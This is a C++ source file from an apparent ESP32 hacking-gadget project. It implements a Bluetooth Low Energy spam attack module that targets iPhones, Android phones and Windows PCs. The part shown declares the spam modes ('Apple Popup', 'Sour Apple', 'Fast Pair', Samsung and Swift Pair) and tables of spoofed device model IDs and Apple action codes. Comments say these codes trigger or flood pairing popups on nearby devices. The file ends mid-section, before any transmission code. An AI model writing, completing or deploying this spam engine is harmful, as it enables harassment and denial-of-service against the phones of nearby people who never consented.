rgomez31UAQ/ESP32-DIV_CYD-Gadget/bluetooth_attacks.cpp
// ═══════════════════════════════════════════════════════════════════════════
// HaleHound-CYD Bluetooth Attack Modules Implementation
// BLE Spoofer - Apple Device Popup Spam
// Created: 2026-02-06
// ═══════════════════════════════════════════════════════════════════════════

#include "bluetooth_attacks.h"
#include "shared.h"
#include "touch_buttons.h"
#include "utils.h"
#include "icon.h"
#include "nrf24_config.h"
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <SPI.h>
#include "esp_gap_ble_api.h"
#include "esp_bt_main.h"
#include "esp_bt.h"
#include "esp_wifi.h"
#include <WiFi.h>
#include "skull_bg.h"
#include "ble_database.h"
#include <SD.h>
#include "spi_manager.h"

// ── Classic BT memory release ───────────────────────────────────────────
// ESP32 Bluedroid reserves ~28KB for Classic BT by default.
// HaleHound only uses BLE — release that memory once, permanently.
// Must be called BEFORE BLEDevice::init() triggers esp_bt_controller_init().
static bool g_classicBtReleased = false;
static void releaseClassicBtMemory() {
    if (!g_classicBtReleased) {
        esp_err_t err = esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
        if (err == ESP_OK) {
            g_classicBtReleased = true;
            Serial.printf("[BLE] Classic BT memory released OK, heap: %u\n", ESP.getFreeHeap());
        } else {
            Serial.printf("[BLE] mem_release FAILED: 0x%x, heap: %u\n", err, ESP.getFreeHeap());
            // Don't set flag — try again next time
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// BLE SPOOFER - Multi-Platform BLE Spam Engine
// Targets: Apple iOS, Google Android, Samsung Galaxy, Microsoft Windows
// 7 Modes: Apple Popup, Sour Apple, Fast Pair, Samsung Buds,
//          Samsung Watch, Swift Pair, CHAOS (rotates all)
// Created: 2026-02-14 - Full rebuild with multi-platform support
// ═══════════════════════════════════════════════════════════════════════════

namespace BleSpoofer {

// ═══════════════════════════════════════════════════════════════════════════
// SPAM MODES
// ═══════════════════════════════════════════════════════════════════════════

enum SpamMode {
    MODE_APPLE_POPUP = 0,
    MODE_SOUR_APPLE,
    MODE_FAST_PAIR,
    MODE_SAMSUNG_BUDS,
    MODE_SAMSUNG_WATCH,
    MODE_SWIFT_PAIR,
    MODE_CHAOS,
    MODE_COUNT  // 7
};

static const char* MODE_NAMES[] = {
    "APPLE POPUP",
    "SOUR APPLE",
    "FAST PAIR",
    "SAMSUNG BUDS",
    "SAMSUNG WATCH",
    "SWIFT PAIR",
    "CHAOS"
};

static const char* MODE_TARGETS[] = {
    "iOS",
    "iOS",
    "Android",
    "Android",
    "Android",
    "Windows",
    "ALL"
};

// ═══════════════════════════════════════════════════════════════════════════
// APPLE POPUP - Proximity Pairing (Type 0x07)
// Triggers "Your [Device] is nearby" popup on iPhones/iPads
// Model byte at offset 7 in proximity pairing payload
// ═══════════════════════════════════════════════════════════════════════════

#define APPLE_COUNT 20

static const uint8_t APPLE_MODELS[APPLE_COUNT] = {
    0x02,  // AirPods
    0x0E,  // AirPods Pro
    0x0A,  // AirPods Max
    0x0F,  // AirPods Gen 2
    0x13,  // AirPods Gen 3
    0x14,  // AirPods Pro Gen 2
    0x19,  // AirPods 4
    0x24,  // AirPods Max USB-C
    0x03,  // PowerBeats 3
    0x0B,  // PowerBeats Pro
    0x0C,  // Beats Solo Pro
    0x11,  // Beats Studio Buds
    0x10,  // Beats Flex
    0x05,  // BeatsX
    0x06,  // Beats Solo 3
    0x09,  // Beats Studio 3
    0x17,  // Beats Studio Pro
    0x12,  // Beats Fit Pro
    0x16,  // Beats Studio Buds+
    0x1C   // PowerBeats Pro 2
};

static const char* APPLE_NAMES[APPLE_COUNT] = {
    "AirPods",
    "AirPods Pro",
    "AirPods Max",
    "AirPods Gen2",
    "AirPods Gen3",
    "AirPods Pro2",
    "AirPods 4",
    "AirPods MaxC",
    "PowerBeats3",
    "PowerBeatsPro",
    "Solo Pro",
    "Studio Buds",
    "Beats Flex",
    "BeatsX",
    "Beats Solo3",
    "Beats Studio3",
    "Studio Pro",
    "Beats FitPro",
    "Studio Buds+",
    "PBeatsPro2"
};

// ═══════════════════════════════════════════════════════════════════════════
// SOUR APPLE - Nearby Action (Type 0x0F)
// Floods iOS with random action modals (WiFi, AirDrop, HomeKit, etc.)
// ═══════════════════════════════════════════════════════════════════════════

#define SOUR_APPLE_COUNT 14

static const uint8_t SOUR_APPLE_TYPES[SOUR_APPLE_COUNT] = {
    0x01,  // Setup New iPhone
    0x02,  // Transfer Number
    0x05,  // AirDrop
    0x06,  // HomeKit
    0x09,  // WiFi Password
    0x0D,  // AirPlay
    0x14,  // AppleTV Setup
    0x1E,  // Handoff
    0x20,  // Setup AppleTV
    0x27,  // Setup Device
    0x2B,  // Connect to WiFi
    0x2D,  // Apple Vision Pro
    0x2F,  // HomePod Setup
    0xC0   // Setup Nearby
};

static const char* SOUR_APPLE_NAMES[SOUR_APPLE_COUNT] = {
    "New iPhone",
    "Transfer #",
    "AirDrop",
    "HomeKit",
    "WiFi Pass",
    "AirPlay",
    "AppleTV",
    "Handoff",
    "Setup ATV",
    "Setup Dev",
    "WiFi Net",
    "VisionPro",
    "HomePod",
    "Nearby"
};

// ═══════════════════════════════════════════════════════════════════════════
// GOOGLE FAST PAIR (Service UUID 0xFE2C)
// Triggers "Device ready to pair" notification on Android
// 3-byte Model ID determines device name/image in popup
// ═══════════════════════════════════════════════════════════════════════════

#define FAST_PAIR_COUNT 15

static const uint8_t FAST_PAIR_MODELS[FAST_PAIR_COUNT][3] = {
    {0xD9, 0x93, 0x30},  // Pixel Buds Pro
    {0x82, 0x1F, 0x66},  // Pixel Buds A-Series
    {0x71, 0x7F, 0x41},  // Pixel Buds
    {0xF5, 0x24, 0x94},  // Sony WH-1000XM4
    {0xF0, 0x09, 0x17},  // Sony WH-1000XM5
    {0x01, 0x00, 0x06},  // Bose NC 700
    {0xEF, 0x44, 0x63},  // Bose QC Ultra
    {0x03, 0x1E, 0x06},  // JBL Flip 6
    {0x92, 0xB2, 0x5E},  // JBL Live Pro 2
    {0x1E, 0x89, 0xA7},  // Razer Hammerhead
    {0x02, 0xAA, 0x91},  // Jabra Elite 75t
    {0x2D, 0x7A, 0x23},  // Nothing Ear (1)
    {0xD4, 0x46, 0xA7},  // Sony LinkBuds S
    {0x72, 0xEF, 0x62},  // Samsung Galaxy Buds FE
    {0xF5, 0x8D, 0x14}   // JBL Buds Pro
};

static const char* FAST_PAIR_NAMES[FAST_PAIR_COUNT] = {
    "Pixel BudsPro",
    "Pixel BudsA",
    "Pixel Buds",
    "Sony XM4",
    "Sony XM5",
    "Bose NC700",
    "Bose QC Ultra",
    "JBL Flip 6",
    "JBL LivePro2",
    "Razer HH",
    "Jabra 75t",
    "Nothing Ear1",
    "Sony LinkBuds",
    "Galaxy BudFE",
    "JBL BudsPro"
};

// ═══════════════════════════════════════════════════════════════════════════
// SAMSUNG BUDS (Company ID 0x0075)
// Triggers Samsung EasySetup pairing popup on Galaxy phones
// 3-byte Device ID split with 0x01 separator in packet
// ═══════════════════════════════════════════════════════════════════════════

